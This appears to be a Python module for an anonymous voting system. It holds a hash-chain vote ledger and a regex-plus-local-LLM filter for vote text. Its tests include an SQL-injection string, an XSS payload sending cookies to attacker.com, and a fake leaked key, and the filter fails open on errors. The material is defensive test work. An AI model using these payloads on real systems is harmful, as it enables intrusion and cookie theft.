import hashlib
import requests
import json
from db_base import db_insert, db_query_all, get_db_connection, db_update

# ======================================================================
# 哈希链模块（真正带链式串联 + 防篡改）
# ======================================================================


def check_sn_exists(Sn):
    """
    检查 Sn 是否已经投过票（防多投核心）
    """
    sql = "SELECT block_id FROM hash_chain WHERE Sn = %s"  # 通过 Sn 查询是否已有记录
    res = db_query_all(sql, (Sn,))  # 注意：参数必须是元组，即使只有一个元素也要加逗号
    return len(res) > 0  # 如果查询结果不为空，说明 Sn 已存在，返回 True；否则返回 False


# --------------------- 【核心1】计算区块哈希（串链的关键！）---------------------
def compute_block_hash(prev_hash, Sn, r, S):
    """
    计算当前区块的哈希
    哈希 = 上一块哈希 + 当前数据
    改任何一个字符，哈希全变 → 链就断
    """
    data = f"{prev_hash}{Sn}{r}{S}".encode("utf-8")  # 把字符串转换成字节，才能计算哈希
    return hashlib.sha256(data).hexdigest()  # 计算SHA-256哈希，返回16进制字符串


# --------------------- 【核心2】创建创世区块（链的起点）---------------------
def create_genesis_block():
    prev_hash = "0" * 64  # 第一块没有上一块，用全0
    curr_hash = compute_block_hash(
        prev_hash, "GENESIS", "GENESIS_BLOCK", "GENESIS_SIGN"
    )  # 创世块数据固定，哈希也固定

    sql = """
    INSERT INTO hash_chain (Sn, r, S, prev_hash, curr_hash)
    VALUES (%s, %s, %s, %s, %s)
    """
    params = ("GENESIS", "GENESIS_BLOCK", "GENESIS_SIGN", prev_hash, curr_hash)
    db_insert(sql, params)
    print("创世区块已创建（真正哈希链起点）")


# --------------------- 【核心3】创建新区块 + 自动串链！---------------------
def add_vote_to_chain(Sn, r, S):
    """
    投票上链（带防重复）
    """
    # ===================== 【关键】防重复入库 =====================
    if check_sn_exists(Sn):
        print(f"哈希链拒绝重复上链：Sn {Sn} 已存在！")
        return False, "重复上链"

    # 1. 获取最新区块
    last_block = get_latest_block()
    if not last_block:
        create_genesis_block()
        last_block = get_latest_block()  # 再次获取创世块

    # 2. 拼接链式关系
    new_prev_hash = last_block["curr_hash"]
    new_curr_hash = compute_block_hash(new_prev_hash, Sn, r, S)

    # 3. 插入数据库
    sql = """
    INSERT INTO hash_chain (Sn, r, S, prev_hash, curr_hash)
    VALUES (%s, %s, %s, %s, %s)
    """
    return db_insert(sql, (Sn, r, S, new_prev_hash, new_curr_hash))


# --------------------- 【核心4】校验整条链（防篡改关键）---------------------
def verify_blockchain():
    """
    【完整版】校验哈希链是否被篡改
    遍历整条链，输出所有被篡改的区块，不中途退出
    """
    chain = get_all_blocks()
    tampered_blocks = []  # 存放所有被篡改的区块号

    print("\n" + "=" * 50)
    print("开始完整校验整条哈希链...")
    print("=" * 50)

    for i in range(1, len(chain)):
        current = chain[i]
        previous = chain[i - 1]
        block_num = i + 1  # 人类可读区块号

        # 标记是否合法
        valid = True

        # 1. 检查链是否断裂
        if current["prev_hash"] != previous["curr_hash"]:
            print(f"区块 {block_num}：链断裂！前哈希不匹配")
            tampered_blocks.append(block_num)
            valid = False

        # 2. 检查区块自身哈希是否被篡改
        real_hash = compute_block_hash(
            current["prev_hash"], current["Sn"], current["r"], current["S"]
        )
        if current["curr_hash"] != real_hash:
            print(f" 区块 {block_num}：数据被篡改！哈希不匹配")
            if block_num not in tampered_blocks:
                tampered_blocks.append(block_num)
            valid = False

    # 最终结果
    print("=" * 50)
    if len(tampered_blocks) == 0:
        print(" 整条哈希链完整，未被篡改！")
        return True
    else:
        print(f"  共发现 {len(tampered_blocks)} 个被篡改的区块：{tampered_blocks}")
        print("❌ 哈希链已被篡改！")
        return False

# --------------------- ai边界防御大模型API调用 ---------------------
def ai_content_security_audit(project_id, Sn, r):
    """
    🆕 [信安边界防御] 完美工程化双引擎：强逻辑基线初筛 + 本地大模型恶意Payload审计
    """
    import requests
    import json
    import re
    
    cleaned_r = str(r).strip()
    
    # -------------------------------------------------------------------------
    # 🛡️ 第一道防线：本地强逻辑基线过滤（彻底解决1.5B模型误杀正常中文的问题）
    # -------------------------------------------------------------------------
    cleaned_r = str(r).strip()
    
    # 1. 规则 A：如果是标准英文字母、数字、下划线组合（如 Candidate_A, ShunYuan_Zhang），直接放行
    # 正则含义：只允许字母、数字、下划线，坚决禁止 < > ' " ; = 等任何代码和特殊注入符号
    if re.match(r"^[a-zA-Z0-9_]+$", cleaned_r):
        # 额外安检：卡死 SQL 关键特征词
        if not any(keyword in cleaned_r.upper() for keyword in ["SELECT", "UNION", "OR 1="]):
            return True, "通过本地合规英文/下划线基线初筛放行"

    # 2. 规则 B：合法的纯中文投票/支持文本直接放行
    if re.match(r"^[\u4e00-\u9fa5a-zA-Z0-9，！、\s]+$", cleaned_r):
        if not any(keyword in cleaned_r.upper() for keyword in ["SCRIPT", "SELECT", "UNION", "AND 1="]):
            return True, "通过本地纯合规中文语义基线初筛放行"
    # -------------------------------------------------------------------------
    # 🧠 第二道防线：本地私有化大模型深度语义审计（只处理漏过白名单的代码特征流量）
    # -------------------------------------------------------------------------
    api_url = "http://127.0.0.1:11434/v1/chat/completions"
    api_key = "ollama_local"
    model_name = "qwen2.5:1.5b"
    
    # 此时把 Prompt 的精力集中在“恶意 Payload 和溢出注入检测”上，不再考模型对于“好人”的分类
    prompt = f"""
    You are an AI Security Gateway for an anonymous voting platform. 
    Task: Audit this text 'r' to classify its security risk.
    
    Current Text to check: r = "{r}"
    
    [STRICT AUDIT RULES]
    1. If r looks like a normal vote identifier, name, or support phrase (e.g. 'Candidate_A', 'ShunYuan_Zhang', or normal Chinese names), it is SAFE.
    2. If r contains codes like <script>, fetch, alert, or HTML tags, it is a CODE INJECTION (XSS) attack.
    3. If r contains database keywords combined with special chars (e.g. SELECT, UNION, SLEEP, AND 1=1, single quotes), it is an SQL INJECTION attack.
    4. If r contains system configurations, keys, credentials, or long random token strings (e.g. SYSTEM_SECRET_KEY, PASSWORD=, CONFIDENTIAL), it is a COVERT CHANNEL DATA LEAK / ASSET EXFILTRATION.
    
    [REQUIREMENT]
    Analyze the text based on the 4 rules above. You MUST reply with a pure JSON object ONLY. DO NOT include any markdown code blocks.
    Format: {{"is_safe": true/false, "reason": "A brief, precise explanation in English or Chinese explaining EXACTLY which rule was triggered"}}
    """

    headers = {
        "Authorization": f"Bearer {api_key}",
        "Content-Type": "application/json"
    }
    
    payload = {
        "model": model_name,
        "messages": [{"role": "user", "content": prompt}],
        "temperature": 0.01,
        "max_tokens": 150
    }

    try:
        response = requests.post(api_url, headers=headers, json=payload, timeout=15)
        res_data = response.json()
        
        ai_output = None
        if 'choices' in res_data and len(res_data['choices']) > 0:
            ai_output = res_data['choices'][0].get('message', {}).get('content', '')

        if not ai_output:
            raise ValueError("Ollama Local API returned empty text")

        ai_output = ai_output.strip()
        
        if ai_output.startswith("```"):
            ai_output = ai_output.split("```")[1]
            if ai_output.startswith("json"):
                ai_output = ai_output[4:]
        ai_output = ai_output.strip()
        
        audit_result = json.loads(ai_output)
        is_safe = audit_result.get("is_safe", True)
        reason = audit_result.get("reason", "放行")

        if not is_safe:
            log_sql = """
            INSERT INTO ai_security_log (project_id, attack_sn, malicious_r, intercept_reason)
            VALUES (%s, %s, %s, %s)
            """
            from db_base import db_insert
            db_insert(log_sql, (project_id, Sn, r, reason))
            print(f"🚨 [本地AI拦截成功] 检测到恶意漏洞投毒或资产外泄！内容: {r} | 拦截原因: {reason}")
            
        return is_safe, reason

    except Exception as e:
        print(f"⚠️ [本地AI安检网关异常]: {e}，启用传统密码学防线兜底放行。")
        return True, "本地AI服务忙，交由底层非对称验签兜底"

# --------------------- 数据库工具函数 ---------------------
def get_latest_block():
    sql = "SELECT * FROM hash_chain ORDER BY block_id DESC LIMIT 1"
    res = db_query_all(sql)  # 查询最新区块，按 block_id 降序排序，取第一条
    return res[0] if res else None  # 返回最新区块，如果没有返回 None


def get_all_blocks():
    sql = "SELECT * FROM hash_chain ORDER BY block_id ASC"
    return db_query_all(sql)  # 查询所有区块，按 block_id 升序排序，返回完整链


# ======================================================================
# 🚀 🆕 【需求三新增】：供前端自检沙盒查询链上原始数据
# ======================================================================
def get_block_by_sn(Sn):
    """
    【数据溯源】：根据选票凭证 Sn 捞出链上区块
    支持首页的“区块链选票防篡改自检”沙盒向底层提取数据
    """
    sql = "SELECT * FROM hash_chain WHERE Sn = %s"
    res = db_query_all(sql, (Sn,))
    return res[0] if res else None


# --------------------- 测试专用篡改函数 ---------------------
def tamper_block_2_for_test():
    """【测试专用】篡改第二个区块的投票内容"""
    sql = "UPDATE hash_chain SET r = %s WHERE block_id = 2"
    db_update(sql, ("我被恶意篡改了！",))
    print("✅ 已成功篡改第二个区块！")


def tamper_two_blocks_test():
    """测试：同时篡改 区块2 和 区块4"""
    sql1 = "UPDATE hash_chain SET r = %s WHERE block_id = 2"
    sql2 = "UPDATE hash_chain SET r = %s WHERE block_id = 4"
    from db_base import db_update

    db_update(sql1, ("【恶意篡改】区块2",))
    db_update(sql2, ("【恶意篡改】区块4",))
    print("✅ 已同时篡改区块 2 和 区块 4！")


# -------------------------------------------------------------------------
# 测试

# ------------------- 完整哈希链全功能测试 -------------------
"""if __name__ == "__main__":
    print("=" * 50)
    print("========== 哈希链全功能测试 ==========")
    print("=" * 50)

    # 1. 创建创世区块（只跑第一次）
    print("\n【步骤1】创建创世区块")
    # 先判断有没有创世块
    if not get_latest_block():
        create_genesis_block()

    # 2. 模拟投票1 → 自动上链
    print("\n【步骤2】用户1投票 → 上链")
    add_vote_to_chain(Sn="USER001", r="Candidate_A", S="SIGNATURE_001")

    # 3. 模拟投票2 → 自动上链
    print("\n【步骤3】用户2投票 → 上链")
    add_vote_to_chain(Sn="USER002", r="Candidate_B", S="SIGNATURE_002")

    print("\n【步骤3】用户3投票 → 上链")
    add_vote_to_chain(Sn="USER002", r="Candidate_C", S="SIGNATURE_003")

    # 4. 查看整条链
    print("\n【步骤4】查看整条哈希链")
    chain = get_all_blocks()
    for block in chain:
        print(
            f"区块 {block['block_id']} | prev_hash={block['prev_hash'][:10]}... | curr_hash={block['curr_hash'][:10]}..."
        )

    # 5. 校验链是否完整
    print("\n【步骤5】校验哈希链完整性")
    verify_blockchain()

    # 6. 模拟篡改数据（故意破坏链）
    print("\n【步骤6】模拟攻击者篡改数据库！")
    # 这里我们手动修改一下 hash_chain 表（模拟攻击）
    conn, cur = get_db_connection()
    if conn and cur:
        cur.execute("UPDATE hash_chain SET r='FAKE_VOTE' WHERE block_id=2")
        conn.commit()
        cur.close()
        conn.close()

    # 7. 再次校验 → 必然失败
    print("\n【步骤7】篡改后再次校验")
    verify_blockchain()
"""

# -------------------------------------------------------------------------
# 🧪 AI 边界防御网关专项单体测试
# -------------------------------------------------------------------------
if __name__ == "__main__":
    print("\n" + "="*50)
    print("🚀 开始执行：中科大 AI 统一平台网关连通性与拦截测试")
    print("="*50)

    # 用例 1：模拟一个完全合法的正常投票，预期结果：AI 放行 (True)
    print("\n[测试用例 1] 模拟正常选民投给合法候选人...")
    normal_r = "Candidate_A' AND (SELECT 1 FROM (SELECT(SLEEP(5)))x) AND '1'='1"
    is_safe_1, reason_1 = ai_content_security_audit(project_id=1, Sn="NORMAL_USER_888", r=normal_r)
    print(f"👉 审计结果 -> 是否放行: {is_safe_1}")
    print(f"👉 AI 评语: {reason_1}")

    # 用例 2：模拟黑客进行跨站脚本（XSS）代码投毒，预期结果：AI 拦截 (False) 并自动写入日志表
    print("\n[测试用例 2] 模拟黑客匿名提交恶意 XSS 注入脚本...")
    malicious_xss = "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>"
    is_safe_2, reason_2 = ai_content_security_audit(project_id=1, Sn="HACKER_XSS_999", r=malicious_xss)
    print(f"👉 审计结果 -> 是否放行: {is_safe_2}")
    print(f"👉 AI 评语: {reason_2}")

    # 用例 3：模拟内鬼利用隐蔽通道传输敏感字符串，预期结果：AI 拦截 (False)
    print("\n[测试用例 3] 模拟内鬼利用匿名通道外传机密数据（隐蔽通道攻击）...")
    covert_r = "SYSTEM_SECRET_KEY=dhajksdh9213hjasdh8a9dhasjkdh (Confidential)"
    is_safe_3, reason_3 = ai_content_security_audit(project_id=1, Sn="INSIDER_LEAK_007", r=covert_r)
    print(f"👉 审计结果 -> 是否放行: {is_safe_3}")
    print(f"👉 AI 评语: {reason_3}")
    
    print("\n" + "="*50)
    print("🏁 测试结束，请检查控制台输出与数据库 ai_security_log 表记录")
    print("="*50)
